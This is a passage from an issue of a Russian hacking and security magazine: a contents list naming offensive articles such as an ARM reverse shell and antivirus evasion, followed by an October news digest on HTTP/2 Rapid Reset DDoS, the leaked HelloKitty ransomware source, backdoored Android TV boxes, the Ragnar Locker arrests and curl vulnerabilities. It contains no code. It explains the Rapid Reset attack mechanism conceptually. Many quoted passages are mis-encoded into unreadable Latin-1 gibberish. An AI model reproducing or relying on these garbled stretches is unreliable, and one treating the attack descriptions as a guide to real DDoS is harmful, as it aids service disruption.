
            № 295
CONTENTS


    MEGANews
  Самые важные события в мире инфо сека за октябрь

    Письмо с сюрпризом
  Изучаем уловки и хитрости для доставки писем с малварью

    Фишинг в соцсетях
  Как соци аль ные сети помогают хакерам

    ChatGPT на рыбалке
  Выманиваем пароль при помощи QR-кода и чат-бота

    LPE на казенном макбуке
  Злоупот ребляем установкой VS Code для локального повышения при виле гий

    Железный бряк
  Ис пользуем хар двер ные брейк-пойнты в пен тестер ских целях

    WiX-фикс
  Ис сле дуем инсталлятор Windows Installer XML Toolset

    Уроки форензики
  Боль шой гид по арте фактам Windows

    HTB Format
  Проксируем запросы в Redis через мисконфиг Nginx

    HTB PC
  Ма нипу лируем протоколом gRPC при взло ме сервера

    HTB Intentions
  Эксплу атируем слож ную SQL-инъ екцию для дампа базы данных

    HTB Jupiter
  Выполняем про извольный код с помощью Jupyter и SatTrack

    Инструменты разведчика
  Извле каем данные из Instagram, Telegram, GitHub и других источни ков

    Сделай мне красиво
  Изобретаем пер сональ ный ней росете вой фото уве личитель

    Шелл-код для ARM
  Пишем на ассемблере свой реверс-шелл для устройств на ARM

    Веселые хеши
  Реализуем тех нику API Hashing, что бы обдурить антивирус

    The Possessor
  Делаем аналог СОРМ-2 на Linux и RouterOS

    Pwnagotchi
  Со бираем хакерский девайс с искусственным интеллектом

    Титры
  Кто дела ет этот жур нал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: уязвимость HTTP/2 Rapid Reset стала при-
чиной  мощнейших  DDoS-атак,  в  тысячах  устрой ств
на Android наш ли бэкдор, разработчика вымогателя Ragnar
Locker арестовали, устройства Cisco IOS XE подвергаются
мас совым ата кам, уче ные разработа ли атаку side-channel
iLeakage, угро жающую устройствам Apple, а также другие
интересные события октября.
ОТРАЖЕН
МОЩНЕЙШИЙ DDOS
В ИСТОРИИ





Спе циалисты Amazon Web Services (AWS), Cloudare и Google предупредили
о 0-day-проблеме HTTP/2 Rapid Reset, которую злоумышленники используют
для DDoS-атак с августа текущего года.
   Благодаря уязвимости в про токоле HTTP/2 мощность атак, направленных
на облачную инфраструктуру Google, достигла 398 мил лионов запросов
в секунду (requests per second), а ата ки, нап равленные на AWS и Cloudare,
пре выси ли 155 миллионов и 201 миллион зап росов в секунду.
  Для срав нения: прошлый рекорд составлял 71 мил лион запросов в секун-
ду и был за фик сирован в начале 2023 года.





                           Атаки, отражен ные Google

Ко рень проблемы кроется в уяз вимости нулевого дня CVE-2023-44487,
существование которой специалис там пришлось хра нить в сек рете боль ше
месяца, чтобы дать поставщикам защитных решений и прочим заинтересо-
ванным сторонам вре мя отреаги ровать, прежде чем об уяз вимости станет
известно злоумыш ленникам.
   Уяз вимость была обнаружена в протоколе HTTP/2 и, как уже нет рудно
догадаться, может использоваться для организации мощных DDoS-атак.
Дело в том, что важной осо бенностью HTTP/2 является мультиплексирование
запросов в одном TCP-соединении, что реализова но в виде параллель ных
потоков.
   Хо тя для пре дот вращения атак в протоколе HTTP/2 предусмотре на защита
в виде параметра, ограничивающе го количество одновременно активных
потоков, она не всег да помогает. Поэто му раз работчики протокола при дума-
ли более эффектив ную защит ную меру — отмену запроса, которая не при-
водит к пол ному разрыву соеди нения, но, к сожале нию, может использовать-
ся не по назначению.
   Так, кли ент, желающий прервать зап рос, может использовать фрейм
RST_STREAM для прек ращения обмена данными. Ата ка HTTP/2 Rapid Reset
эксплуати рует именно  эту особен ность протокола, чтобы очень быс тро
отправ лять и отменять зап росы, тем самым обходя установленный сервером
максимум для одновременных потоков.





                     Ра бота RST_STREAM (Cloudare)


      «Àòà êè HTTP/2 Rapid Reset ñòðîÿòñÿ íà èñïîëüçîâàíèè íåñ êîëüêèõ
      HTTP/2-ñîåäèíåíèé è áûñ òðîì ÷åðåäîâàíèè çàï ðîñîâ è îòìåí. Íàï-«
      ðèìåð, ïåðåäà åòñÿ ñåðèÿ çàï ðîñîâ íà íåñ êîëüêî ïîòîêîâ ñ ïîñ ëåäó-
     þùåé îòìå íîé äëÿ êàæäîãî èç íèõ. Öåëåâàÿ ñèñ òåìà áóäåò àíà ëèçè-
      ðîâàòü è âûïîëíÿòü êàæäûé çàï ðîñ, ãåíåðèðóÿ æóð íàëû äëÿ çàï ðîñà,
      êîòîðûé çàòåì ñáðà ñûâà åòñÿ èëè îòìå íÿåòñÿ êëèåíòîì», — ïèøóò ñïå-
      öèàëèñ òû AWS.
        «Ïðîòîêîë íå òðå áóåò îò êëèåíòà è ñåð âåðà êàêèì ëèáî îáðà çîì
      ñîãëàñîâû âàòü îòìå íó, è êëèåíò ìîæåò ñäå ëàòü ýòî â îäíîñòîðîííåì
      ïîðÿä êå, — îáúÿñíÿåò Google. — Òàê æå êëèåíò ïîëàãà åò, ÷òî îòìå íà
       âñòó ïèò  â  ñèëó íåìåäëåííî,  êàê  òîëüêî  ñåð âåð  ïîëó÷èò ôðåéì
      RST_STREAM, äî òîãî êàê áóäóò îáðà áîòà íû ëþáûå äðó ãèå äàííûå
      ýòîãî TCP-ñîåäèíåíèÿ».                »
То есть, ини циируя сотни тысяч потоков HTTP/2 и быстро отменяя их, зло-
умыш ленни ки могут полностью выводить сай ты из строя, не пре вышая мак-
симальное количес тво потоков, разрешен ное сер вером. Еще один важный
аспект этой проб лемы в том, что эти атаки могут быть реализованы силами
относительно неболь ших бот нетов, состоящих при мерно из 20 тысяч машин.





                   Логика работы HTTP/2 Rapid Reset


      «Àâòîìàòèçèðóÿ è ìàñ øòà áèðóÿ ýòîò ïðîñ òîé øàáëîí „çàï ðîñ, îòìå íà,
      çàï ðîñ, îòìå íà“, çëîóìûø ëåííèêè ìîãóò äîáèòüñÿ îòêà çà â îáñëó-«
      æèâà íèè è îòêëþ ÷èòü ëþáîé ñåð âåð èëè ïðèëîæå íèå, ðàáîòà þùåå
      ñî ñòàíäàð òíîé èìïëå ìåíòàöèåé HTTP/2», — îáúÿñíÿþò â Cloudflare.                »
Также эксперты Cloudare сообщают, что прок си-сер веры или балансиров-
щики нагрузки HTTP/2 осо бенно восприимчивы к таким атакам. Так, сеть ком-
пании оказалась перег ружена на учас тке между TLS-прокси и апстри мом,
поэтому ущерб был нанесен еще до того, как вредонос ные запросы попали
под блокировку. В итоге ата ки привели к уве личению количес тва оши-
бок 502 для клиентов Cloudare.
  По сло вам представителей Cloudare, в ито ге для борьбы с атаками
HTTP/2 Rapid Reset была использована система, пред назначенная для обра-
бот ки гиперобъемных (hyper-volumetric) атак, под названием IP Jail, которую
ком пания расширила для охвата всей сво ей инфраструктуры.
   Эта система помещает IP-адреса нарушителей «в тюрьму» и запрещает
им применять HTTP/2 для любого домена Cloudare в течение опре деленного
периода, при этом для реальных пользователей, исполь зующих этот IP-адрес,
про изводительность сни жается лишь нез начительно.
  Компания Amazon, в свою очередь, заяви ла, что отра зила уже десятки
подоб ных атак, одна ко не рас крывает подробной информации об этих инци-
дентах и их пос ледствиях. Лишь подчеркивает ся, что доступность клиентских
сервисов была сох ранена.
  В Google заяви ли, что компании уда лось смягчить эти атаки, уве личив
дополнительную про пускную способ ность на гра нице своей сети.
  В итоге все три компании делают вывод, что наилучшим способом защиты
от HTTP/2 Rapid Reset будет использование всех доступных средств защиты
от HTTP-флуда, а также повышение устойчивости к DDoS-атакам посредс-
твом многогранных защит ных мер.
  К сожале нию, пос коль ку данные атаки строятся на протоколе HTTP/2,
не сущес тву ет единого решения, позволяюще го пол ностью блокировать этот
вид DDoS’а.


      «Ñðåäñ òâà çàùèòû îò ýòîãî âåê òîðà àòàê ìîãóò ïðèíèìàòü ðàç ëè÷íûå
     ôîð ìû, íî â îñíîâíîì îíè ñâîäÿòñÿ  ê îòñëå æèâà íèþ ñòà òèñ òèêè«
      ñîåäèíåíèé è èñïîëüçîâàíèþ ðàç ëè÷íûõ ñèãíàëîâ è áèç íåñ ëîãèêè
      äëÿ îïðå äåëå íèÿ ïîëåç íîñòè êàæäîãî ñîåäèíåíèÿ, — ðàñ ñêà çûâà þò
     èíæå íåðû   Google.  —   Íàï ðèìåð,   åñëè   ñîåäèíåíèå  èìå åò
      áîëåå 100 çàï ðîñîâ è áîëåå 50% èç íèõ îòìå íåíû, îíî ñòà íîâèòñÿ
      êàíäèäàòîì äëÿ ïðèìåíå íèÿ îòâåòíûõ ìåð. Ìàñ øòà áû è òèï ýòèõ
      îòâåòíûõ ìåð çàâèñÿò îò ñòå ïåíè ðèñ êà äëÿ êàæäîé êîíêðåòíîé ïëàò-
     ôîðìû, íî îíè ìîãóò âàðüèðîâàòüñÿ  îò ïðèíóäèòåëüíîãî èñïîëü-
      çîâàíèÿ ôðåéìîâ GOAWAY äî íåìåä ëåííîãî çàê ðûòèÿ TCP-ñîåäè-
      íåíèÿ.
        Äëÿ çàùèòû îò âàðèàíòà àòà êè, êîãäà çëîóìûø ëåííèêè íå îòìå íÿþò
      çàï ðîñû ñðà çó, ìû ðåêîìåíäóåì ñåð âåðàì HTTP/2 çàê ðûâàòü ñîåäè-
      íåíèÿ, ïðå âûøà þùèå ëèìèò îäíîâðå ìåííûõ ïîòîêîâ. Ýòî ìîæåò ïðî-
      èñõîäèòü êàê ñðà çó, òàê è ïîñ ëå íåáîëüøîãî êîëè÷åñ òâà ïîâ òîðíûõ
      íàðóøå íèé».                »

ЦЕНА УТЕЧКИ ДАННЫХ — 5,5 ÌÈËËÈÎÍÀ ÐÓÁËÅÉ

Специалисты  ГК  «Солар»  сообщили,  что  ключевой  угрозой  для  российско го  биз неса
в 2023 году стали мас штабные утеч ки кон фиденциальной информации, которые теперь про-
исхо дят ежемесяч но. Круп ный бизнес и государс твен ный сег мент теряют от одной утечки
в среднем 5,5 миллиона рублей.

Эта оцен ка включает прямые финан совые издержки, но не учитывает потен циальные репута-
ционные потери, а так же штрафные сан кции. При этом более 55% расходов на ликвидацию
последс твий таких инцидентов в организа циях идут имен но на решение проблем, связанных
с репута ционными потерями.

С утечками информа ции чаще всего стал кива ются ком пании из сфе ры ретей ла (37%), финан-
сового сектора (20%) и игровой индус трии (10%). Общий объем опубликованных дан ных уже
сос тавля ет 91,8 Тбайт.

УТЕКЛИ ИСХОДНИКИ
HELLOKITTY





На русскоязычном хак форуме выложили исходный код мал вари HelloKitty.
Предполагаемый автор вымогателя заявил, что уже раз рабаты вает новый,
более мощный шифровальщик.
  Первым пуб ликацию исходников обнаружил ИБ-исследователь 3xp0rt. Он
сообщил, что нек то под ником kapuchin0 выложил на хакерском форуме «пер-
вую ветку» шиф ровальщика HelloKitty.





Хотя на этот раз хакер использовал ник kapuchin0, также он известен
под псев донимом Gookee. Это го человека свя зыва ли с попыткой продать
доступ к сети Sony Network Japan в 2020 году и с RaaS-угро зой Gooke
Ransomware, исходники которой он тоже пытал ся продать на хакер ском
форуме.
   3xp0rt   счи тает,    что   соз дал   вымога тель    HelloKitty   именно
kapuchin0/Gookee, а сам хакер заявляет, что уже работает над новым продук-
том, который будет «гораздо интереснее, чем LockBit».
  Обнародованный архив  hellokitty.zip содержит решение Microsoft Visual
Studio для соз дания шифровальщика и дешиф ратора HelloKitty, а также биб-
лиотеку NTRUEncrypt, которую эта версия вымогателя использует для шиф-
рования фай лов.
  Известный ИБ-эксперт Май кл Гиллеспи (Michael Gillespie) уже под твердил,
что в откры том доступе опубликован настоящий исходный код HelloKitty,
который использовался в ата ках в 2020 году.
  Иссле дователи отмечают, что обычно пос ле утечек и раскры тий исходных
кодов малвари их берут на воору жение другие злоумыш ленни ки, которые
потом стро ят на их осно ве собственные вре доно сы. К примеру, ранее в этом
году эксперты SentinelOne под счи тали, что сразу несколько хакгрупп исполь-
зуют попав ший в откры тый доступ исходный код шиф ровальщика Babuk
и соз дали на его базе как минимум девять вредоносов, ориентированных
на VMware ESXi.





САТЬЯ НАДЕЛЛА ОБ УХОДЕ С РЫНКА СМАРТФОНОВ
В большом интервью изданию Business Insider глава компании Microsoft Сатья Наделла сооб-
щил, что жалеет о своем решении вывес ти Microsoft с рынка мобиль ных устройств. Ког да жур-
налист поп росил его назвать какую-либо стратегичес кую ошиб ку или просто неудач ное
решение, о котором Наделла сожалеет в ретроспективе,  тот отве тил, что оно связано
с Windows Phone.

         «Решение, о котором, как мне кажется, говорят многие (и одно из самых→      слож ных решений, которые я принял, став CEO), заключалось в том, что мы
       отка зались от мобильных телефо нов в том виде, в котором они тогда существо-
       вали. Огля дываясь назад, думаю, мы могли бы справиться с этой задачей, воз-
      можно пере осмыслив катего рию вычислительных устройств меж ду ПК, план-
      шетами и телефонами», — рас сказал Наделла.





                                     Продолжение статьи →
← Начало статьи
 ОБНАРУЖЕНЫ
 ANDROID-ДЕВАЙСЫ
 С БЭКДОРОМ





  В начале текущего года независимый ИБ-исследова тель Даниэль Милишич
   (Daniel Milisic) обнаружил, что на Amazon продаются Android-прис тавки T95,
  прямо «из коробки» зараженные сложной мал варью. Теперь это иссле дова-
  ние продолжили спе циалисты компании Human Security, и выяснилось, что
  бэкдор содержат семь прис тавок и один план шет, а так же признаки зараже-
  ния демонстри руют более 200 моделей дру гих Android-устройств.
     Отчет Human Security раз делен на две основные части. Раздел Badbox
  касается зараженных Android-устрой ств и их участия в различных мошен-
  нических схе мах. Вторая часть, получившая название Peachpit, рассказывает
  о  свя зан ном  рекламном  мошенничестве,  в  котором  задействовано
   как минимум 39 приложений для Android и iOS.
     Все началось с того, что во вто рой половине 2022 года исследователи
  обнаружили приложе ние для  Android, которое демонстрировало подоз-
  рительный  трафик  и  подклю чалось  к  домену  yermobi.com. В  янва-
  ре 2023 года Милишич опубликовал свое иссле дова ние приставки T95, где
  тоже упоминался этот домен. После этого команда Human Security приобрела
   эту приставку, а также несколько других девайсов и приступила к их изучению.
    В общей сложности исследователи обна ружили восемь устрой ств с уста-
  новленны ми бэкдорами: прис тавки T95, T95Z, T95 Max, X88, Q9, X12 Plus
  и MXQ Pro 5G, а так же планшет J5-W. Суммарно Human Security выявила
  не менее 74 тысяч Android-устройств с признаками зараже ния Badbox по все-
  му миру, в том числе в домах, на пред при ятиях и в школах на тер ритории
  США.





                    Купленные и изу ченные экспертами устройства

  Такие устройства производят ся в Китае, и перед тем, как они попада ют в руки
  реселлеров, в их прошив ку добавляется бэк дор. При этом неиз вес тно,
  на каком эта пе цепоч ки пос тавок про исхо дит компрометация. В посвященной
  Badbox части отче та эксперты отмечают, что бюд жетные Android-прис тавки
  для потоко вого видео (как правило, стоимостью менее 50 долларов) зачас-
  тую продают ся под разными брендами или вооб ще его не имеют, так что
  прос ледить их про исхождение и цепочку поставок может быть затруднитель-
   но.
    По словам спе циалистов, обнаруженный бэкдор основан на мобильной
  малвари Triada, впервые обнаруженной в 2016 году «Лабораторией Кас пер-
  ского». Этот вре донос модифицирует один из эле ментов ОС Android, получая
  доступ к установ ленным на устройстве жертвы приложениям, а после свя-
  зывается со своими операторами.

         «Êîãäà ïîëüçîâàòåëü ïîä êëþ ÷àåò òàêîå óñòðîéñòâî, îíî ñâÿçûâà åòñÿ
         ñî ñâîèì óïðàâëÿþùèì ñåð âåðîì â Êèòàå, çàãðóæà åò îòòó äà íàáîð «
        èíñ òðóê öèé è íà÷èíà åò äåëàòü êó÷ó ïëîõèõ âåùåé, — ïèøóò èññëå äîâà-
          òåëè. —  Ýòî  êàê  øâåéöàð ñêèé  íîæ  äëÿ  ñîâåð øåíèÿ  ïàêîñ òåé
         â èíòåðíå òå».                 »
  Экспертам удалось отследить несколько видов мошенничества, связанных
  со взломанными устройствами. Например, зараженные гаджеты используют-
  ся в рекламном мошенничестве, в качестве резидентных прокси, при меня-
  ются для соз дания фейковых учетных записей Gmail и WhatsApp, а также
  для удаленной установки малвари.
     Злоумышленники продают доступ к скомпро метированным домашним
  сетям сво их жертв другим преступни кам, заявляя, что сей час имеют доступ
  при мерно к 10 миллионам домаш них IP-адре сов и 7 мил лионам мобильных
   IP-адре сов.
     Что каса ется упо мянутой выше мошенничес кой схе мы Peachpit, она стро-
   ится вок руг мобильных приложений, которые присутство вали как на Android-
  приставках, так и на телефо нах под управлением Android и iOS.
    Суммарно компания выявила 39 вре доносных при ложе ний для Android,
  iOS и приставок. В основном это оказались шаблонные при ложения не очень
  высокого качества, среди которых были решения для фитнеса и подсчета
  выпитой воды. Эти при ложения выполняли целый ряд мошеннических дей-
   ствий, вклю чая показы скрытой и вре доносной рекламы (через скрытый
   WebView), а также спуфинг тра фика. По подсче там иссле дователей, только
  при ложе ния для Android были суммарно загружены более 15 миллионов раз.
     Хо тя разработ чики Peachpit, судя по всему, не являются раз работчиками
  Badbox, авторы исследова ния утверждают, что эти группы вза имодейству ют
  между собой.


         «Ó íèõ åñòü SDK, êîòîðûé ïðåäíàçíà ÷åí äëÿ ðåê ëàìíîãî ìîøåííè÷åñ-
          òâà, è ìû îáíà ðóæèëè âåð ñèþ ýòîãî SDK, ñîâ ïàäà þùóþ ñ íàç âàíèåì «
         ìîäóëÿ, êîòîðûé óñòà íàâ ëèâàëñÿ íà Badbox. Ýòî òîëüêî îäíà èç ñâÿ-
          çåé, êîòîðûå ìû âûÿâèëè», — ñîîáùàþò â Human Security.                 »
  По данным исследователей, с рекламными объявлениями этой кампании свя-
  зано более 4 миллиардов рекламных запросов в день, которые затрагива-
  ют 121 тысячу устройств под управлением Android и 159 тысяч устройств
  под управле нием iOS. По самым скромным под счетам, учас тни ки этой схемы
   могут зарабатывать до 2 миллионов долларов за месяц.
     Представите ли Google сооб щают, что все 20 при ложе ний для Android,
  которые обнаружили исследова тели Human Security, уже удалены из Google
   Play Store. Что касается устройств с бэкдорами Badbox, в ком пании отме тили,
   что эти устройства «не были сертифици рованы Play Protect».
    В свою оче редь, предста вители Apple заяви ли, что пять при ложе ний
  из тех, о которых сообщили исследова тели, наруша ли правила компании.
  Разработ чикам было дано 14 дней, чтобы устра нить эти наруше ния, и раз-
  работ чики четырех из пяти приложений это сделали.
    В зак лючение экспер ты Human Security сооб щают, что с кон ца 2022 года
  они предприняли ряд неких мер, нап равленных про тив Badbox и Peachpit,
  а также передали все соб ранные данные правоохранительным орга нам.
  В результате к нас тоящему моменту эти мошеннические схе мы практически
  прекратили свою работу.
    Иссле дователи подчерки вают, что злоумыш ленники адап тировались к их
  вмешательству в режиме реального вре мени: сна чала они активно рас-
  пространяли обновле ния, которые помогали им скрывать свои действия,
  а затем операто ры Badbox вооб ще отклю чили управля ющие серверы, обес-
  печивавшие работу бэкдора.





                        Сок ращение мас штабов Badbox

  Несмотря на это, зараженные устройства по-преж нему работают во многих
  домах и организациях по всему миру. Эксперты предупреждают, что удалить
  с них малварь будет край не сложно, поэтому такие девай сы следует рассмат-
  ривать как «спящую» угрозу, которая попросту ждет нового набора инструк-
   ций.
     Рав но как и Даниэль Милишич, исследова тели рекомендуют людям,
  покупающим Android-приставки, приобретать устройства, чей производитель
  известен и заслуживает доверия, и по возможности отказаться от исполь-
  зования потенциаль но опасных IoT-гад жетов.


        «Ëþáîé ìîæåò ñëó ÷àéíî êóïèòü Badbox-óñòðîéñòâî â èíòåðíå òå, äàæå
        íå ïîäîç ðåâàÿ, ÷òî ýòî ôàëüøèâ êà, ïîä êëþ ÷èòü åãî è íåîñîç íàííî «
         çàïóñ òèòü âðå äîíîñ íîå ÏÎ ñ áýê äîðîì. Ýòî âðå äîíîñ íîå ÏÎ ìîæåò
         èñïîëüçîâàòüñÿ äëÿ êðà æè ëè÷ íûõ äàííûõ, çàïóñ êà ñêðû òûõ áîòîâ,
         ñîç äàíèÿ ðåçèäåíòíûõ ïðîê ñè, êðà æè ôàéëîâ cookie è îäíîðàçîâûõ
         ïàðîëåé, à òàê æå ðåàëèçàöèè óíèêàëüíûõ ìîøåííè÷åñ êèõ ñõåì», —
        ïðå äîñ òåðåãà þò àíà ëèòèêè.                 »

 ГИПЕРОБЪЕМНЫЕ DDOS-АТАКИ УСИЛИВАЮТСЯ
  В третьем квартале 2023 года компания Cloudare отра зила тысячи гиперобъемных DDoS-атак,
   в которых исполь зовалась недавно обнаруженная уязвимость HTTP/2 Rapid Reset. Мощ ность
  89 из этих атак превысила 100 миллионов зап росов в секунду (requests per second).

   Самая круп ная атака этого квартала достигла пиковой мощности в 201 мил лион зап росов
   в  секунду,  что в три раза  превыша ет  предыдущий  рекорд,  установленный  в  фев-
   рале 2023 года.





   Также Cloudare сообщает об увеличении совокупного объема HTTP-трафика DDoS-атак
   на 65% за последний квартал и увеличении количества DDoS-атак L3/L4 на 14%.





  В целом 5% от общего количес тва DDoS-тра фика было нап равлено на организации в США,
   более 3,1% досталось ком паниям в Сингапуре, а на треть ем месте оказался Китай с 2,2%.





   Но есть и хорошие новос ти: количес тво вымогатель ских DDoS-атак снижает ся второй квартал
   подряд. По сло вам исследователей, «злоумышленники осоз нали, что орга низа ции не будут им
   пла тить».




 MICROSOFT
 ЗАПРЕТИТ
 АКТИВАЦИЮ
 СТАРЫМИ КЛЮЧАМИ





  Об наружилось, что компания Microsoft прикрыла одну из излюбленных «лазе-
   ек» поль зовате лей и запретила активировать Windows 10 или Windows 11 ста-
  рыми ключами от Windows 7 и Windows 8.
    В кон це сентября ком пания Microsoft напомнила о том, что формально
  предложение  по  бесплатному  обновлению  старых ОС  до  Windows
  10 или 11 было актуально только до 29 июля 2016 года. В компании подчер-
   кнули, что предложение давно истекло, теперь способ бес плат ного обновле-
  ния закрыт.
     Также в сооб щении уточняется, что пользователи Windows 10 по-преж-
  нему могут бесплатно перейти на Windows 11 (конечно, если их компьютеры
  соот ветствуют необходимым требованиям).
    Дело в том, что, хотя предложение по бес платному переходу на Windows
  10 дей ствовало толь ко до 29 июля 2016 года (а после этой даты его перес-
   тали показы вать пользователям), быстро обна ружи лось, что старые установ-
   ки Windows все равно мож но обновить с помощью загруженных ISO-образов
  и USB-накопителей, а также мож но использовать ста рые ключи Windows
  для активации новых установок. И эта «лазейка» оставалась акту аль ной
  по сей день.
     Судя по все му, запрет будет при менять ся только к будущим вер сиям
  Windows. Так, активировать новую уста новку Windows 11 Pro 22H2 с помощью
  ключа от Windows 8 Pro все еще возможно, одна ко акти вировать новую тес-
  товую сборку Windows 11 Canary (24H2) — уже нельзя.





 В РОССИИ ЗАБЛОКИРОВАНО 167 VPN

   Гла ва Центра мониторинга и управления сетью связи общего пользования (ЦМУ ССОП) Сергей
   Хуторцев сообщил, что к нас тояще му моменту в Рос сии под блокировку попали 167 VPN-сер-
   висов и более 200 поч товых сервисов в рам ках про тиводействия угрозам устой чивос ти,
   безопас ности и целос тнос ти сети связи.

   Также, по его словам, под ограничения попадают более 590 000 информацион ных ресурсов,
   более 2000 фишинговых сайтов, более 84 при ложений и более 20 «центров распростра нения
   вредоносного ПО». При этом 17 500 IP-адресов включены в «белый список» и исключены
   из филь тра ции в сис темах блокировки ТСПУ (технические средства противодействия угрозам).





                                        Продолжение статьи →
← Начало статьи
 АРЕСТОВАН
 РАЗРАБОТЧИК
 RAGNAR LOCKER





  Правоохранители  захватили  сайты вымогатель ской  группировки  Ragnar
   Locker, через которые злоумышленники вели переговоры со своими жертва-
  ми и сли вали украден ные данные, чтобы шан тажировать постра давших.
     Те перь при посеще нии любого из сай тов Ragnar Locker можно увидеть
  сообщение-заглушку, в котором говорится о конфискации сайтов, а также
  сообщается, что в этой операции при нимали учас тие правоохранитель ные
  орга ны из Гер мании, Испа нии, Италии, Латвии, Нидер ландов, США, Фран-
   ции, Чехии и Японии.
     Вскоре пос ле это го представители Евро пола сообщили, что «ключевая
   цель», связанная с этой хакгруппой, арестована в Париже.

        «„Êëþ ÷åâàÿ öåëü“, ñâÿçàííàÿ ñ ýòèì âûìîãà òåëüñêèì ÏÎ, àðåñ òîâàíà
         â Ïàðèæå (Ôðàíöèÿ) 16 îêòÿáðÿ, à â äîìå ýòîãî ÷åëîâå êà â ×åõèè ïðî- «
        âåäåí îáûñê. Â ïîñ ëåäó þùèå äíè áûëè ïðîâåäå íû äîï ðîñû ïÿòè
        ïîäîç ðåâà åìûõ â Èñïà íèè è Ëàòâèè, — çàÿâ ëÿåò Åâðîïîë. — Â êîíöå
         ýòîé íåäåëè ãëàâ íûé çëîóìûø ëåííèê, ïîäîç ðåâà åìûé â òîì, ÷òî îí
         ðàç ðàáîò÷èê ýòîé ãðóï ïèðîâ êè, ïðåä ñòàë ïåðåä ñóäåáíûìè ñëå äîâà-
         òåëÿìè ïàðèæñêîãî ñóäà».                 »
  Из вестно, что арестованному во Фран ции подоз реваемому уже предъ явлен
  ряд обвинений, связанных с вымогательством, отмы вани ем денег и участием
   в преступных опе рациях.
     Как сооб щают правоохранители, еще в мае 2021 года Евроюст открыл
   дело, связанное с Ragnar Locker, по зап росу француз ских влас тей. В резуль-
   тате этой сов местной операции еще в сен тябре 2021 года украинская кибер-
  полиция    арестовала    двух    подоз рева емых,    а    впоследствии,
   в октябре 2022 года, еще один подозреваемый был задер жан в Канаде в ходе
  сов местной опе рации, про веденной правоохранительными органами Фран-
   ции, Канады и США.
    В итоге эти дей ствия при вели к новым арес там и конфискации девяти сер-
  веров груп пировки. Сооб щается, что в итоге была отключена инфраструктура
   груп пы, в том числе пять серверов в Нидерландах, два в Германии и два
   в Шве ции.
     Как отмечают в Европоле, с 2020 года опе рато ры Ragnar Locker атакова-
  ли 168 международных компаний в разных стра нах мира, в том числе провели
  серию атак, нацеленных на объекты критичес кой инфраструктуры.





  ВИТАЛИК БУТЕРИН НЕ ПРОДАВАЛ ETH С 2018 ГОДА
   Крупные криптовалют ные тран закции в сети не остаются незамеченными. На этот раз вни-
   мание ана лити ков PeckShield прив лек перевод 14,93 мил лиона USDC на биржу Gemini
   с кошель ка vitalik.eth, связанного с соучредителем Ethereum Виталиком Бутери ным.
     В ответ на возникшие слухи Бутерин заявил в социальной сети Warpcast, что не продавал
   криптовалюту уже много лет. А предста вители Ethereum Foundation пояс нили СМИ, что это была
   лишь операция под писи с исполь зованием имени Бутерина в Ethereum.

             «Регулярное напоми нание: если вы видите статью „Виталик отправил XXX →         ETH на [биржу]“, на самом деле я ничего не продавал. Почти всег да [это озна-
            чает],  что  я жертвовал  на  какой-то  благот воритель ный, некоммерчес кий
         или другой проект, а получатель продавал, потому что ему было нужно пок рыть
          рас ходы.
          Я не „продавал“ ETH для личной выгоды с 2018 года», — заявил Бутерин.

 УЯЗВИМОСТИ CURL
 ОКАЗАЛИСЬ
 НЕСТРАШНЫМИ





  В начале месяца разработчики curl предупредили, что 11 октября 2023 года
  выйдут патчи для двух уязвимостей, одна из которых может стать «худ шей»
  за пос леднее вре мя. Исправления действительно вышли, но оказалось, что
  серьезность проблем была силь но преувеличена.
     4 октября раз работ чик curl Дэниел Стен берг (Daniel Stenberg) предуп-
   редил, что цикл разработки curl 8.4.0 будет сок ращен и новая вер сия вый-
  дет 11 октября ради устранения уязвимостей.

       «Ìû  ñîê ðàùà åì  ðåëèç öèêë  è  11  îêòÿáðÿ  âûïóñ òèì  curl  8.4.0,
         â êîòîðóþ âîéäóò èñïðàâ ëåíèÿ äëÿ îäíîé CVE âûñîêîé ñòå ïåíè ñåðü- «
         åçíîñòè è îäíîé CVE íèç êîé ñòå ïåíè ñåðüåçíîñòè, — ïèñàë Ñòåí-
          áåðã. — Òà óÿç âèìîñòü, êîòîðàÿ èìå åò âûñîêóþ ñòå ïåíü ñåðüåçíîñòè,
        âåðîÿòíî, îêà æåòñÿ õóä øåé ïðîáëåìîé áåçîïàñ íîñòè â curl çà äîëãîå
        âðå ìÿ».                 »
  Пос коль ку утилита командной стро ки curl и связанная с ней библиотека libcurl
  широко используются во многих библиотеках и приложе ниях, а также входят
   в сос тав практически всех операци онных систем, это предуп реждение выз-
  вало  нешуточные  опасения  среди  ИБ-спе циалис тов  и  разработчиков.
  Некоторые даже предполагали, что проблема может оказаться столь же
  серьезной, как нашумев шая уяз вимость в Log4j.
    Но когда разработчики представили curl 8.4.0 и обнародовали информа-
  цию об уязвимостях, ста ло ясно, что угроза была преувеличена.
     Что каса ется менее опас ной уяз вимости, CVE-2023-38546, она связана
  с   инжекта ми   файлов    cookie   и    затрагивает    только     libcurl
   (от 7.9.1 до 8.3.0 включительно). Как объ ясняют сами разработчики, веро-
   ятность  того, что злоумыш ленники выпол нят ряд условий, необходимых
  для сра баты вания этой уязвимости, крайне мала. Кроме того, по их словам,
   cookie-инъекции представляют лишь небольшой риск для безопасности
  поль зовате лей.
     Вто рая уязвимость, CVE-2023-38545, которая должна была стать «худ-
  шей» в исто рии, представляет собой переполнение буфера хипа и зас тра-
   гива ет импле ментацию прок си-протокола SOCKS5 в curl и libcurl. Об этой
  ошибке через платформу HackerOne сооб щил ИБ-иссле дователь Джей
  Сатиро (Jay Satiro). Он получил за этот баг 4600 долларов США — крупней-
  шую на сегод няшний день наг раду за ошиб ку в curl.
     Воз можные последствия эксплуата ции бага вклю чают повреждение дан-
  ных и, в худшем случае, выполнение произвольного кода на стороне клиента.
  В частнос ти, переполнение буфера может произой ти во время медленного
  хендшейка прокси SOCKS5. Уязвимость возникает из-за некорректной обра-
  бот ки имен хостов длиной более 255 байт. Если имя хоста превыша-
   ет 255 байт,  curl не позволяет прокси резол вить имя хоста удаленно
  и перехо дит к локаль ному резолверу.

        «Èç çà îøèáêè ëîêàëüíàÿ ïåðåìåííàÿ, êîòîðàÿ èíñ òðóê òèðó åò  curl
         „ïîç âîëèòü õîñ òó ðåçîëâèòü èìÿ“, ìîæåò ïîëó÷èòü íåâåð íîå çíà ÷åíèå «
         âî âðå ìÿ ìåä ëåííîãî õåíäøåéêà SOCKS5 è, âîï ðåêè çàìûñ ëó, ñêî-
        ïèðîâàòü ñëèø êîì äëèííîå èìÿ õîñ òà â öåëåâîé áóôåð, âìåñ òî òîãî
